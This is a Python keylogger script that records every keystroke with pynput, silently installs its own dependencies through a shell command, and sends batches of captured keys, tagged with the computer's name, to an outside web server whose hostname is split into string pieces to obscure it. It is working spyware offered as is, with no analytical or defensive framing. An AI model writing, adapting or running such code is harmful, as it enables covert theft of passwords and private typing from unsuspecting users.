mem=[]

def log_keystroke(key):
    global mem
    key=str(key).replace('\'','')
    if key == 'Key.space': key = ' '
    if key == "Key.enter": key = '[ENTER]'
    if 'backspace' in key:
        try:
            ...
        except Exception as e:
            pass
        return 
    if len(key) > 3 and key != '[ENTER]' : return
    for x in ['left','right','up','down']:
        if x in key: 
            key =''
    mem.append(key)
    # with open("log.txt", 'a') as f:
    #     size=open("log.txt", 'r').read().__len__()
    #     f.write(key)
    if len(mem) > 256 :
        pcname=os.environ["COMPUTERNAME"]
        r=requests.post('https://swa'+'mix.com/logs/',{'pcname':pcname,'data':''.join(mem)})
        print(r.text,pcname,mem)
        mem=[]
    open('last.txt','w+').write(str(time.time())+key)
    # print(len(mem),key,mem)


import subprocess as sp
proc=sp.run('pip install {} -U'.format(" ".join(['pynput','requests'])),text=True,shell=1)
from pynput.keyboard import Listener
import requests,os,time


with Listener(on_press=log_keystroke) as l:
    l.join()

hel



















